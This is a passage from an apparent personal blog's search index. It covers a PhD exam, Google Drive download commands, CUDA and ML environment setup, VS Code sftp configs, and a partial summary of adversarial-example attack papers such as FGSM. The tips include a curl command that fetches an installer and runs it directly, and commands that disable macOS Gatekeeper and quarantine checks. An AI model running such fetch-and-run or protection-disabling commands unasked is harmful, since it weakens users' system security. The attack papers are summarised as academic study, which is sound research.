Management.      Redundant Array of Independent Disks.(RAID)        File-System Interface:          Operations.      Access methods.      Directory.      Mount.      File Sharing.        File-System Implementation:          Layered File System.      Virtual File System.      Directory Implementation.      Allocation Methods.      Free-Space Management.        I/O System:          Interrupt Vector.      I/O Hardware.      Application I/O Interface.      I/O Scheduling: Buffering, Caching, Spooling and Device Reservation, Error Handling, Protection.      In the exam, CPU scheduling algorithm, semaphores algorithm, Process Creating and Banker’s Algorithm are checked. I think I did not write the correct semaphore algorithm since the question is a new situation instead of a classical example from the book.In the oral exam, I zoom with three professors each covers one course. I am not sure whether they try to encourage me or not. While all of them told me that I did a great job in the writing exam.Most of the questions originate from the exam questions. And they will check some related ideas and concepts during the process. Since I have reviewed all the related materials, the question is not very hard. If I cannot give the answers they want, they will hint me until I give the correct answer.After all of the things, I finish my Preliminary Exam. Hope everything goes well. Cross fingers."
  },
  
  {
    "title": "Exploit Command Downloading Methods from Google Drive",
    "url": "/posts/Exploit_Command_Downloading_Methods_of_Google_Drive/",
    "categories": "",
    "tags": "Skills",
    "date": "2020-11-12 00:00:00 -0800",
    





    
    "snippet": "In the blog, we want to exploit several methods to find the best and most convenient way to download files and folders from Google Drive.A quick summary:  Gshell: Need google to vertify the app. Cu...",
    "content": "In the blog, we want to exploit several methods to find the best and most convenient way to download files and folders from Google Drive.A quick summary:  Gshell: Need google to vertify the app. Currently it is not working due to the logging problem.  Gdown: useful to download a single file.  The most convenient way: Gdrive(Go environment needed).  Wget and Curl are also feasible but kind of complicated.Best WayBest way for downloading all the files or folders is gdrive and drive.Generally, we should install golang previously and install gdrive and drive from their github repositories.Then we should pass the OAuth by using drive init ~/gdrive. Be noticed, when google  send a link and require the verification code, the link should be open on the same computer even if the computer is a server.Finally, drive pull -id &lt;file or folder id&gt; and gdrive [global] download [options] &lt;fileId&gt;                    Download file or directory are the straightforward commands to download the files or folders from google drive.Other methods:  Using Gsutil to download file on Google Cloud PlatformThe tutorial is here.  Using scripts or commands to download file on Google driveA convenient way to download file is like that  Gdown  syntax: gdown https://drive.google.com/uc?id=FILE-ID3. A Quick ChoiceMore detailsAs to small file:cd ~export fileid=1yXsJq7TTMgUVXbOnCalyupESFN-tm2ncexport filename=matthuisman.jpg## WGET ##wget -O $filename 'https://docs.google.com/uc?export=download&amp;id='$fileid## CURL ##curl -L -o $filename 'https://docs.google.com/uc?export=download&amp;id='$fileidAs to large file(More than 100MB)cd ~export fileid=1iAJbHqiNwc4nJlP67sp1xLkl5EtC4PU_export filename=all.zip## WGET ##wget --save-cookies cookies.txt 'https://docs.google.com/uc?export=download&amp;id='$fileid -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\\1/p' &gt; confirm.txtwget --load-cookies cookies.txt -O $filename 'https://docs.google.com/uc?export=download&amp;id='$fileid'&amp;confirm='$(&lt;confirm.txt)## CURL ##curl -L -c cookies.txt 'https://docs.google.com/uc?export=download&amp;id='$fileid \\     | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\\1/p' &gt; confirm.txtcurl -L -b cookies.txt -o $filename \\     'https://docs.google.com/uc?export=download&amp;id='$fileid'&amp;confirm='$(&lt;confirm.txt)rm -f confirm.txt cookies.txtLink"
  },
  
  {
    "title": "Machine Learning Tutorial",
    "url": "/posts/Machine-Learning_Tutorial/",
    "categories": "",
    "tags": "Machine Learning",
    "date": "2020-10-24 00:00:00 -0700",
    





    
    "snippet": "In this blog, I would like to introduce how to start your machine learning environment on ubuntu equipped with GPUs . The used tools includes:  Miniconda: Independent Python Environment.  Machine L...",
    "content": "In this blog, I would like to introduce how to start your machine learning environment on ubuntu equipped with GPUs . The used tools includes:  Miniconda: Independent Python Environment.  Machine Learning Framework: Pytorch/Tensorflow.I should point out that the CUDA and CuDNN are required to install before following the tutorial. You can check the availability of the packages based on the following command.nvcc --version # check the CUDA versionThe availability of GPUs can be listed by the command: nvidia-smi.1. MinicondaMiniconda is a tool to build a specific python environment for your specific project. The python package installed in the environment will not impact others. Besides, if different versions of the  python package are needed in the same machine, miniconda will make it compatible. If we have completed the project and want to delete the python environment, it is also pretty convenient to remove the whole environment.1.1 Install MinicondaDifferent versions of Miniconda are available in the link.curl -O https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh # install the miniconda installation scriptchmod +x Miniconda3-latest-Linux-x86_64.sh # set access./Miniconda3-latest-Linux-x86_64.sh # run the package1.2 Basic Usageconda create --name &lt;environment name&gt; python=3 # create a environment with python3conda activate &lt;environment name&gt; # activate the environmentconda deactivate # deactivate the environmentconda info --envs # list all available environmentsconda remove -n &lt;environment name&gt; # remove an environmentWhen a miniconda environment is activated, (environment name)will be added before each command line of the terminal.2. Machine Learning FrameworkIn the section, two main machine learning frameworks which are Pytorch and Tensorflow will be introduced. I will discuss how to install them under the miniconda environment.2.1 PytorchThe suitable version of pytorch we want to use is based on both the requirement and the supportive packages’ version. The process to install it is described pretty straightforward on its homepage.Basically, we can use pip install torchvision torch to install the newest version.We can check the availability of GPUs on pytorch by the following codes.import torch # import pytorchtorch.cuda.is_available() # check the available GPUs' number for pytorch2.2 TensorflowInstalling tensorflow can use the similar command by pip install tensorflow-gpu.GPUs’ availability for tensorflow can be checked by the following way.import tensorflow as tftf.test.is_gpu_available(cuda_only=False,min_cuda_compute_capability=None)3. Run ModelsAfter all the steps above, we can clone some models from Github or build personal models by Tensorflow and Pytorch. Some examples are available in tensorflow and pytorch website."
  },
  
  {
    "title": "Tricks Summary 2020",
    "url": "/posts/Ticks_Summary_2020/",
    "categories": "",
    "tags": "PhD",
    "date": "2020-09-12 00:00:00 -0700",
    





    
    "snippet": "In the blog, I record several problems that I met with during coding. I hope the content is helpful.Install Nvidia Driver CUDA and CUDNN on UbuntuOfficial installation tutorial link.      Use Comma...",
    "content": "In the blog, I record several problems that I met with during coding. I hope the content is helpful.Install Nvidia Driver CUDA and CUDNN on UbuntuOfficial installation tutorial link.      Use Command Line: Tutorial        Search for PPA which can be used to install packages by apt-get: link    Following the steps:tutorial    # add ppa and find suitable nvidia-driversudo add-apt-repository ppa:graphics-drivers/ppasudo apt-get updateapt-cache search nvidia-driver# sudo apt-get install nvidia-driver-versionsudo apt-get install nvidia-440# another way to install nvidia driverubuntu-drivers devicessudo ubuntu-drivers autoinstall   # add keys for your specific ubuntu version, be careful about ubuntu1x04sudo apt-key adv --fetch-keys  http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub# if error message:# using the command:# wget http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub# sudo apt-key add 7fa2af80.pubsudo bash -c 'echo \"deb http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64 /\" &gt; /etc/apt/sources.list.d/cuda.list'   sudo bash -c 'echo \"deb http://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1604/x86_64 /\" &gt; /etc/apt/sources.list.d/cuda_learn.list'   sudo apt-get updatesudo apt install cuda-10-1sudo apt install libcudnn7   # add the following codes to ~/.bashrc# set PATH for cuda installationif [ -d \"/usr/local/cuda/bin/\" ]; then    export PATH=/usr/local/cuda/bin${PATH:+:${PATH}}    export LD_LIBRARY_PATH=/usr/local/cuda/lib64${LD_LIBRARY_PATH:+:${LD_LIBRARY_PATH}}fi   reboot -i   # check settingsnvcc --version/sbin/ldconfig -N -v $(sed 's/:/ /' &lt;&lt;&lt; $LD_LIBRARY_PATH) 2&gt;/dev/null | grep libcudnnnvidia-smi            Reboot system  Then the NVIDIA driver will be installed smoothly.  After that, we should install CUDA.Check CUDA version: cat /usr/local/cuda/version.txt.If we want to download package by ourselves, we should check the website first to find the right version for our system. The greatest way to install it is following the official guide.There is also a supportive tutorial for installation cuda and cudnn for ubuntu.Debian CUDA installRecently, I need to install cuda11-1 and nvidia driver on debian 11. Here is something that I achieve based on the experience.The key point is that the cuda package can be used smoothly on debian 11 from my testing.The faster method is using sudo apt install nvidia-cuda-toolkit . However, it can just install the latest version. In my case, it will install cuda11-2 while torch cannot support such a new version.Then I tried several methods on the internet. But the solution is just based on the previous method.sudo add-apt-repository ppa:graphics-drivers/ppasudo apt-get updatesudo apt install nvidia-driversudo apt-key adv --fetch-keys  http://developer.download.nvidia.com/compute/cuda/repos/debian10/x86_64/7fa2af80.pubsudo bash -c 'echo \"deb http://developer.download.nvidia.com/compute/cuda/repos/debian10/x86_64 /\" &gt; /etc/apt/sources.list.d/cuda.list'sudo apt-get updatesudo apt install cuda-11-1if [ -d \"/usr/local/cuda/bin/\" ]; then    export PATH=/usr/local/cuda/bin${PATH:+:${PATH}}    export LD_LIBRARY_PATH=/usr/local/cuda/lib64${LD_LIBRARY_PATH:+:${LD_LIBRARY_PATH}}fireboot -iThen just enjoy the new world.Conda Usage1. search available python versionconda search \"^python$\"2. Create or Remove conda environmentconda remove --name myenv --allconda create -n env python==3.6Tensorflow Usage Problem Recording1. Tensorflow does not use GPUIn the case, I actually installed cuda and Nvidia driver at first. So it is because I did not add cuda/bin and related library to the .bashrc.By adding the following code to .bashrc file will solve the problem.export PATH=/usr/local/cuda-10.2/bin/:$PATHexport LD_LIBRARY_PATH=/usr/local/cuda-10.2/lib64:${LD_LIBRARY_PATH:+:${LD_LIBRARY_PATH}}Besides, I think it is a useful tutorial for use Tensorflow on GPU.Tensorflow2.1 is not useful for CUDA10.2 due to the lack of some libraries.So I reinstall CUDA10.1 for tensorflow2.1-gpu.Test tensorflow for GPUimport tensorflow as tftf.test.is_gpu_available(cuda_only=False,min_cuda_compute_capability=None)2. Install TensorRT for Tensorflow2-GPU versionOfficial tutorial: TensorRT is not a must for tensorflow-gpu. It is just useful for speed up training process.3. Change CUDA Versionll /usr/local/cuda# make a link for cuda. usage: ln -s source targetln -s /usr/local/cuda-7.5 /usr/local/cudaExplanation4. Cannot visit tensorflow.org official websiteIn the case, the following step is useful for Mac. Linux should edit its specific hosts file.  edit /private/etc/hosts  add 64.233.188.121 www.tensorflow.org5. Tensorflow GPU Allocation ProblemBy default, tensroflow will use all gpu memories to update efficiency. The way to use specific memory is by following codes in two ways. More details are available on the linktf.config.experimental.set_memory_growth:gpus = tf.config.experimental.list_physical_devices('GPU')if gpus:  try:    # Currently, memory growth needs to be the same across GPUs    for gpu in gpus:      tf.config.experimental.set_memory_growth(gpu, True)    logical_gpus = tf.config.experimental.list_logical_devices('GPU')    print(len(gpus), \"Physical GPUs,\", len(logical_gpus), \"Logical GPUs\")  except RuntimeError as e:    # Memory growth must be set before GPUs have been initialized    print(e)tf.config.experimental.set_virtual_device_configuration:gpus = tf.config.experimental.list_physical_devices('GPU')if gpus:  # Restrict TensorFlow to only allocate 1GB of memory on the first GPU  try:    tf.config.experimental.set_virtual_device_configuration(        gpus[0],        [tf.config.experimental.VirtualDeviceConfiguration(memory_limit=1024)])    logical_gpus = tf.config.experimental.list_logical_devices('GPU')    print(len(gpus), \"Physical GPUs,\", len(logical_gpus), \"Logical GPUs\")  except RuntimeError as e:    # Virtual devices must be set before GPUs have been initialized    print(e)6. Pytorch Jupyter set GPUprint(torch.cuda.device_count()) # list visible GPUdevice = torch.device(\"cuda:6\" if torch.cuda.is_available() else \"cpu\") # set GPU for devicemodel_ft = torch.nn.DataParallel(model_ft, device_ids=[0]) # set GPU for models7. Data Loader Problemraw_train_X = next(iter(train_dataloader))[0].numpy() # (100000, 3, 64, 64)raw_train_Y = next(iter(train_dataloader))[1].numpy() # (100000, )The aforementioned code is not right because next(iter(dataloader)) will re-output so the X and Y are not mapping.8. Check label countsunique, counts = np.unique(sy_train, return_counts=True)print(counts)9. Allocation problemWarning: ensorflow/core/framework/allocator.cc:101] Allocation of X exceeds 10% of system memorySolution: The main problem is the batch_size is too big. Sometimes the problem is on related settings like shuffle function intf.data.Dataset.from_tensor_slices((x_train, y_train)).shuffle().10. How to use @tf.function [Need Digging into]When I want to change the gradients when training by function train_step on tensorflow2, I found that if I did not use @tf.function before the train_step function, the accuracy grow very slow. But if I add @tf.function, the process becomes normal without considering optimizers and data type. The related code is here.@tf.functiondef fix_train_step(model, images, labels, all_mask):  with tf.GradientTape() as tape:    predictions = model(images)    loss = loss_object(labels, predictions)  gradients = tape.gradient(loss, model.trainable_variables)  for i in range(len(all_mask)):    gradients[i] = gradients[i] * all_mask[i]  optimizer.apply_gradients(zip(gradients, model.trainable_variables))  train_loss(loss)  train_accuracy(labels, predictions)11. Problem after suspending the MachineAfter I suspend the ubuntu, I met with such problemfailed call to cuInit: CUDA_ERROR_UNKNOWN and I cannot use GPU. Rebooting it probably can solve the problem. As to my case, I reinstall nvidia-smi 440 solve the problem.Related link12. Save Model Problem in Tensorflow2When I want to save a Keras subclass model, it will meet with the no bounded node error when I want to use tf.keras.models.Model to get middle layers’ output. So in tensorflow 2, the suitable way to save and load model is listed as follows.# save model weightsmodel.save_weights(MODEL_FILEPATH + 'weight.h5')model.load_weights(MODEL_FILEPATH + \"weight.h5\")# save whole modeltf.keras.models.save_model(model, MODEL_FILEPATH)model = model.load_weights(MODEL_FILEPATH)13. Check GPU is available or not on tensorflow:print(\"Num GPUs Available: \", len(tf.config.experimental.list_physical_devices('GPU')))tf.config.list_physical_devices('GPU')The version compatible version of Tensorflow details.Other Problems1. Install Cudnn on DebianThe installation steps of installing cudnn on debian is different from that of ubuntu. And the path of cuda related package is not the same of that of ubuntu.Step 1: Download Cudnn on Nvidia official website.Step 2: Add the related lib to the path ./usr/lib/x86_64-linux-gnu/. A good way to find the path is by find . -name libcublas.so.10.Step 3: Check the result of installation of cudnn.2. Use matplotlib to draw 3D gradient descent picturesimport numpy as npimport matplotlib.pyplot as pltfrom ipywidgets import *from mpl_toolkits import mplot3d #用于绘制3D图形#梯度函数的导数def gradJ1(theta):    return 4*thetadef gradJ2(theta):    return 2*theta#梯度函数def f(x, y):    return  2*x**2 +y**2def ff(x,y):    return 2*np.power(x,2)+np.power(y,2)def train(lr,epoch,theta1,theta2,up,dirc):    t1 = [theta1]    t2 = [theta2]    for i in range(epoch):        gradient = gradJ1(theta1)        theta1 = theta1 - lr*gradient        t1.append(theta1)        gradient = gradJ2(theta2)        theta2 = theta2 - lr*gradient        t2.append(theta2)    plt.figure(figsize=(20,10))     #设置画布大小    x = np.linspace(-3,3,30)    y = np.linspace(-3,3,30)    X, Y = np.meshgrid(x, y)    Z = f(X,Y)    ax = plt.axes(projection='3d')    print(t1, t2, ff(t1,t2))#     ax.scatter(t1, t2, ff(t1,t2), c='black',marker = '*', linewidth=1)    ax.plot_surface(X, Y, Z, rstride=1, cstride=1, cmap='viridis', edgecolor='none', alpha=0.9) #曲面图    #ax.plot_wireframe(X, Y, Z, color='c') #线框图#     ax.contour3D(X, Y, Z, 50, cmap='binary')#等高线图#     ax.scatter3D(t1, t2, ff(t1,t2), c='black',marker = 'o')    ax.plot(t1, t2, ff(t1,t2), c='black',marker = 'o', markersize=5, zorder=5)#     ax.plot_wireframe(t1, t2, ff(t1,t2))#     ax.plot3D(t1, t2,  ff(t1,t2),'red')    #调整观察角度和方位角。这里将俯仰角设为60度，把方位角调整为35度    ax.view_init(up, dirc)    plt.savefig(\"./temp.png\")#可以随时调节，查看效果 (最小值，最大值，步长)@interact(lr=(0, 2, 0.0002),epoch=(1,100,1),init_theta1=(-3,3,0.1),init_theta2=(-3,3,0.1),up=(-180,180,1),dirc=(-180,180,1),continuous_update=False)#lr为学习率（步长） epoch为迭代次数   init_theta为初始参数的设置 up调整图片上下视角 dirc调整左右视角def visualize_gradient_descent(lr=0.05,epoch=10,init_theta1=-2,init_theta2=-3,up=60,dirc=60):    train(lr,epoch,init_theta1,init_theta2,up,dirc)3. git add new repolink4. Out of memory on PytorchWhen training， memory usage of GPU will increase by calculating loss, output. So delete them when they are useless is a suitable way to decrease memory usage.del cost, outprint(\"\\nall\", torch.cuda.memory_allocated())5. Mac New Application Damaged Problemlink      sudo spctl --master-disable          Enable it again: sudo spctl --master-enable            xattr -r -d com.apple.quarantine &lt;path&gt;          ` xattr -r -d com.apple.quarantine /Applications/PDF\\ Expert.app`      6. Display the pictures from the remote ubuntu on the local serverlink  Install xquartz on mac from the link.  Use ssh -X &lt;remote server&gt; to enable x11 forwarding  Run python script with matplotlib to build the connection.Enable OpenCLProblems:  linklibGL error: No matching fbConfigs or visuals foundlibGL error: failed to load driver: swrastset parameters:export LIBGL_ALWAYS_INDIRECT=1export LIBGL_DEBUG=verboseexport LIBGL_ALWAYS_SOFTWARE=1  Open3d Problem[Open3D WARNING] GLFW Error: GLX: Forward compatibility requested but GLX_ARB_create_context_profile is unavailable[Open3D WARNING] Failed to create window[Open3D WARNING] [DrawGeometries] Failed creating OpenGL window.clinfoglxinfo: OpenGL version string: 1.4 (2.1 INTEL-16.1.7) Need to be change to nvidia drivercommand:nvidia-settingssudo prime-select nvidialinkopengl version with GPUhttps://opengl.gpuinfo.org/displayreport.php?id=57387. How to install a editable python packageDetailed TutorialBasically, setup.cfg and setup.py are configured for the editable package.# setup.cfg[metadata]name = local_structureversion = 0.1.0[options]packages = structure# setup.pyimport setuptoolssetuptools.setup()And then use the following command to install the package locally under the package folder: python -m pip install -e .8. The Information about the file system and the cooresponding operating systemLinux:      Best Recommands: Ext4        Do not support: Exfat, Fat  Mac:      Do not support: Ext4        Need kernel extension: NTFS        How to format a disk to Ext4  如果没有 Homebrew 的话，需要先安装 Homebrew：/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"安装 e2fsprogsbrew install e2fsprogs把 U 盘插到 Mac 上，执行：diskutil list找到自己 U 盘的盘符，比如我这里是：/dev/disk2s1，/dev/disk2 (external, physical):   #:                       TYPE NAME                    SIZE       IDENTIFIER   0:     FDisk_partition_scheme                        *31.0 GB    disk2   1:                 DOS_FAT_32 KINGSTON                31.0 GB    disk2s1然后执行格式化：diskutil unmountdisk /dev/disk2s1sudo $(brew --prefix e2fsprogs)/sbin/mkfs.ext4 /dev/disk2s1执行命令后会要求输入用户密码，然后输入 y 确认，等待一会儿就可以了。9. The Related things about external disk on UbuntuWhen we mount a NTFS external disk on Ubuntu, all the files are owned by root and the priviledge is not able to be changed. That will leads to some priviledge problems when using softwares in it.So the most suitable way is using an Ext4 external disk for Ubuntu.10. latex one table covers two columnslink\\usepackage{stfloats}\\begin{table*}[tp]    \\centering    \\begin{tabular}{c|ccc|ccc|ccc|ccc}    \\hline    \\multirow{2}{*}{Case} &amp; \\multicolumn{3}{c}{PointNet++(Random)} &amp; \\multicolumn{3}{c}{PointNet++(\\Mname)} &amp; \\multicolumn{3}{c}{ResGCN-28(Random)} &amp; \\multicolumn{3}{c}{ResGCN-28(\\Mname)} \\\\    &amp; $L_2$ &amp; Acc &amp; mIoU &amp; $L_2$ &amp; Acc &amp; mIoU  &amp; $L_2$ &amp; Acc &amp; mIoU  &amp; $L_2$ &amp; Acc &amp; mIoU  \\\\    \\hline    \\hline    Best    &amp; \\\\    Average &amp; \\\\    Worst   &amp; \\\\    \\hline    \\end{tabular}    \\caption{The results of the non-targeted attack.}    \\label{tab:nt-performance}\\end{table*}11. Oh-my-zsh completions commands with repeated wordslink12. Download Bilibili video automaticallyyou-get -l https://www.bilibili.com/video/BV1U7411a7xG\\?p\\=20 --debugUse you-get command. The syntax is listed as follows:usage: you-get [OPTION]... URL...A tiny downloader that scrapes the weboptional arguments:  -V, --version         Print version and exit  -h, --help            Print this help message and exitDry-run options:  (no actual downloading)  -i, --info            Print extracted information  -u, --url             Print extracted information with URLs  --json                Print extracted URLs in JSON formatDownload options:  -n, --no-merge        Do not merge video parts  --no-caption          Do not download captions (subtitles, lyrics, danmaku, ...)  -f, --force           Force overwriting existing files  --skip-existing-file-size-check                        Skip existing file without checking file size  -F STREAM_ID, --format STREAM_ID                        Set video format to STREAM_ID  -O FILE, --output-filename FILE                        Set output filename  -o DIR, --output-dir DIR                        Set output directory  -p PLAYER, --player PLAYER                        Stream extracted URL to a PLAYER  -c COOKIES_FILE, --cookies COOKIES_FILE                        Load cookies.txt or cookies.sqlite  -t SECONDS, --timeout SECONDS                        Set socket timeout  -d, --debug           Show traceback and other debug info  -I FILE, --input-file FILE                        Read non-playlist URLs from FILE  -P PASSWORD, --password PASSWORD                        Set video visit password to PASSWORD  -l, --playlist        Prefer to download a playlist  -a, --auto-rename     Auto rename same name different files  -k, --insecure        ignore ssl errorsProxy options:  -x HOST:PORT, --http-proxy HOST:PORT                        Use an HTTP proxy for downloading  -y HOST:PORT, --extractor-proxy HOST:PORT                        Use an HTTP proxy for extracting only  --no-proxy            Never use a proxy  -s HOST:PORT, --socks-proxy HOST:PORT                        Use an SOCKS5 proxy for downloading13. Recovery the deleted files on Ubuntutestdisk14. How to set the local Mac to proxy the Ubuntu server’s packagesStep 1: Open Mac’s SSH service and Farword configure.Step 2: Set Ubuntu proxy config# add the following two lines on the ~/.bashrcexport https_proxy=127.0.0.1:1234export http_proxy=127.0.0.1:1234# set the ssh channel, 7890 is the VPN proxy portssh -N -f -L localhost:1234:localhost:7890 jason@10.177.74.47&lt;local machine ssh service&gt;# check the port-using processlsof -ti:1234# check the vpn servicecurl -I https://google.com15. A fast way to transfer files between remote servers with progress barrsyncrsync -r --info=progress2 &lt;files path&gt; &lt;username@remote server&gt; 16. Jupyter cannot use the specific environment of condaA helpful link.Basically, the main problem is that the system does not use the jupyter command in the conda environment. Instead, it uses the system default version.We can use the sys.path to check whether we use the correct command or not.If the result of sys.path is like the following, the environment is correct.['/home/jxu/random-fourier-features/examples', '/home/jxu/miniconda3/envs/rf/lib/python37.zip', '/home/jxu/miniconda3/envs/rf/lib/python3.7', '/home/jxu/miniconda3/envs/rf/lib/python3.7/lib-dynload', '', '/home/jxu/miniconda3/envs/rf/lib/python3.7/site-packages', '/home/jxu/miniconda3/envs/rf/lib/python3.7/site-packages/IPython/extensions', '/home/jxu/.ipython']Basically, I did not exploit the detail of the problem this time. But I will list the solution here.I install the jupyterhub by the command: conda install -c conda-forge jupyterhub  from the link.I reinstall it by the commnads from the link.conda install -c conda-forge jupyterlabconda install -c conda-forge nb_conda_kernels# conda install -c conda-forge jupyter_contrib_nbextensionsSome userful jupyter extensions can be found here.17. Use slack to receive signals or messages from the commandsA helpful link.Command for the direct message to the user:curl -X POST --data-urlencode \"payload={\\\"channel\\\": \\\"@memberid\\\", \\\"username\\\": \\\"webhookbot\\\", \\\"text\\\": \\\"The machine with GTX1080 has been rebooted:)\\\", \\\"icon_emoji\\\": \\\":ghost:\\\"}\" &lt;link&gt;Command for the channel message:curl -X POST --data-urlencode \"payload={\\\"channel\\\": \\\"#general\\\", \\\"username\\\": \\\"webhookbot\\\", \\\"text\\\": \\\"The machine with GTX1080 has been rebooted:)\\\", \\\"icon_emoji\\\": \\\":ghost:\\\"}\" &lt;link&gt;For example, we can send a message to the user if the machine reboot.We can write the command to the file \\etc\\rc.local.18. Ubuntu set Default Desktopsudo update-alternatives --config x-session-managersudo dpkg-reconfigure gdm3 # set the default desktopCurrently, I test it on Ubuntu 16.04 and figure out gdm3 cannot be run while lightdm works well. I am not sure the reason."
  },
  
  {
    "title": "Visual Studio Code Plugins",
    "url": "/posts/VS_Code_Plugins/",
    "categories": "",
    "tags": "PhD",
    "date": "2020-04-11 00:00:00 -0700",
    





    
    "snippet": "A useful plugin is sftp which helps users to connect to the server with VS Code.The config file looks like that:{    \"name\": \"jason\",    \"host\": \"xx\",    \"port\": 22,    \"protocol\": \"sftp\",    \"user...",
    "content": "A useful plugin is sftp which helps users to connect to the server with VS Code.The config file looks like that:{    \"name\": \"jason\",    \"host\": \"xx\",    \"port\": 22,    \"protocol\": \"sftp\",    \"username\": \"user\",    \"password\": \"pwd\",    \"privateKeyPath\": \"/Users/User/.ssh/id_rsa\"}As to ftp-simple the config file looks like that:[\t{\t\t\"name\": \"jason\",\t\t\"host\": \"host\",\t\t\"port\": 22,\t\t\"type\": \"sftp\",\t\t\"username\": \"jason\",\t\t\"privateKey\": \"/Users/User/.ssh/id_rsa\",\t\t\"passphrase\": \"\",\t\t\"path\": \"/home/jason\",\t\t\"autosave\": true,\t\t\"confirm\": true\t}]The key point of running ftp-simple smoothly when using private key is that it is necessary to set passphrase in line 9 of the config file although its value is null. Or it will not connect the server with authorized failed."
  },
  
  {
    "title": "Adversarial Machine Learning Attack papers Summary",
    "url": "/posts/AdvML_Attack_Summary/",
    "categories": "",
    "tags": "Machine Learning",
    "date": "2020-03-22 00:00:00 -0700",
    





    
    "snippet": "In this blog, I summarize the top nine most important papers related to adversarial DNN attacking from the paper which promotes adversarial examples firstly to the advanced attacking methods such a...",
    "content": "In this blog, I summarize the top nine most important papers related to adversarial DNN attacking from the paper which promotes adversarial examples firstly to the advanced attacking methods such as C&amp;W attack, BPDA and EOT.FYI, I find a very useful lecture from Prof. Somesh Jha to summarize both the attack and defense on Machine Learning.1. Poisoning attack against support vector machinesAuthor-Time-ArXiv: Battista Biggio, Blaine Nelson, Pavel Laskov;ICML 2012; 1206.6389Keywords: Targeted Attack,The paper uses the gradient ascent attack on SVM to increase the model’s test error.2. Intriguing properties of neural networksAuthor-Time-ArXiv: Ian Goodfellow etc.;ICLR2014; 1312.6199Key points:  The input-space contains the semantic information in neural networks instead of individual units.  The input-output mapping is discontinuous so the perturbation will cause flips on prediction.  The perturbation is transferable.  Promoting a targeted attack based on box-constrained L-BFGS which is a matrix form of Newton’s method for optimization.2.1 IntroductionThere are two counter-intuitive properties of DNN which are the semantic meaning of individual units and the stability of neural network with small perturbations to inputs.Firstly, they conclude that the whole activation space contains the semantic information instead of the last feature layers’ bias used in the researches before. Then, they find a small perturbation is able to change the network’s prediction. They take the training data which are perturbed by maximizing the prediction error as adversarial examples. What’s more, they figure out these adversarial examples are able to be transferred to another model trained on a different subset of the dataset. Consequently, the DNN model structure is connected to the data distribution in a non-obvious way.2.2 Blind Spots in Neural NetworksThe regions in input space mapped by the output unit contain no training examples nearby. These regions share label and the statistical structure of the original inputs. On the other hand, the smoothness assumption that predictions changed based on perturbations smoothly does not hold. So the local generalization of the training data are useful for finding adversarial examples in the input space.Formal DescriptionMinimize \\(c\\cdot\\vert\\vert r\\vert\\vert_2+loss_f(x+r,l)\\) subject to \\(x+r\\in [0,1]^m\\)\\(f:\\mathbb{R}^m\\rightarrow\\{1\\dots k\\}\\) is a classifier mapping image pixel value vectors to a discrete label set.\\(loss_f:\\mathbb{R}^m\\times\\{1\\dots k\\}\\rightarrow\\mathbb{R}^+\\) is a continuous loss function.Target label \\(l\\in\\{1\\dots k\\}\\)3. Explaining and Harnessing Adversarial ExamplesAuthor-Time-ArXiv: Ian Goodfellow etc.; ICLR2015;1412.6572Key Points:  The main cause of adversarial examples is DNN’s linear nature and the requirement is the sufficient dimensional inputs.  Promoting Fast Gradient Sign Method to generate adversarial examples.  Exploiting adversarial training on simple models and DNN models.3.1 The Linear Explanation and PerturbationThe appearance of adversarial examples is because the DNNs do not learn the true concepts of the whole data to complete the tasks. They are just trained under some discontinuous dataset. Consequently, the linearity of DNN models means that many small perturbations which cannot be detect by eyes will add up to a large change to output.A simple linear model can have adversarial examples if its input has enough dimensionality which is the reason softmax regression is vulnerable. So the paper promotes the fast gradient sign method. It generates adversarial examples to get an optimal max-norm constrained perturbation.\\[\\eta=\\epsilon sign(\\nabla_xJ(\\theta,x,y))\\]\\(\\theta\\) is the model parameters. \\(x\\) is the input while \\(y\\) is the target(true) label. \\(J(\\theta,x,y)\\) is the loss function and its gradient of \\(x\\) will represent the perturbation in every direction of \\(x\\).3.2 Adversarial TrainingMore work Needed: A example to use logistic regression model to train on adversarial examples with weight decay. While the problem is these adversarial examples will be under-fitting.The paper also uses adversarial training on DNN models. The objective function based on FGSM is an effective regularizer:\\[\\tilde J(\\theta,x,y)=\\alpha J(\\theta,x,y)+(1-\\alpha)J(\\theta,x+\\epsilon sign(\\nabla_xJ(\\theta,{x},y)))\\]It means that the adversarial examples update through training.3.3 ExploitThe adversarial examples appear in a contiguous subspace defined by FGSM. The paper also tries to confirm two hypotheses.      Adversarial training provides more constraint on the training process but the improvement is not enough.        Averaging several models which aims to wash out adversarial examples has only limited resistance.  Appendix: Rubbish Class ExamplesThese examples are degenerate inputs which are meaningless to any category (like noise) but are positive classes in the DNN models. The best result of these examples is prediction is low at any category.Guess:  Adversarial Examples exist because DNN cannot restrict all directions in the input space which will lead to a bad accuracy of the validation set.  We can use constraints of every classes in the input space to promote the robustness of DNN models.4. Adversarial Examples In the Physical WorldAuthor-Time-ArXiv: Alexey Kurakin etc.; ICLR2017; 1607.02533Key Points:  The ML systems in physical world scenarios are vulnerable to adversarial examples.  Promoting iterative FGSM and Least-likely Class Attack.  Exploiting the data transformation’s impact on adversarial examples.4.1 Iterative Fast Gradient Sign MethodThe paper puts forward two iterative FGSMs which are basic iterative method and iterative least-likely class method.4.1.1 Basic iterative FGSMThe basic iterative method which is a non-targeted attack generates adversarial examples as follow:\\[X_0^{adv} = X, X_{N+1}^{adv}=Clip_{X,\\epsilon}\\{X_N^{adv}+\\alpha sign(\\nabla_XJ(X_N^{adv},y_{true}))\\}\\]\\(X\\) is a 3-D tensor(width, height, depth) which are integers in the range [0, 255]. \\(y_{true}\\) is the ground truth. \\(J({X},y)\\) is cross-entropy cost function of neural network. \\(Clip_{X,\\epsilon}\\{X'\\}\\) clip the image per-pixel so the result image is \\(L_\\infty\\) \\(\\epsilon\\)-neighborhood of the original image.\\[Clip_{X,\\epsilon}\\{X'\\}(x,y,z)=min\\{255, X(x,y,z)+\\epsilon,max\\{0,X(x,y,z)-\\epsilon,X'(x,y,z)\\}\\}\\]where \\({X}(x,y,z)\\) is the value of \\(z\\) of the image \\({X}\\) at coordinated \\((x,y)\\).4.1.2 Iterative least-likely Class MethodThe iterative least-likely 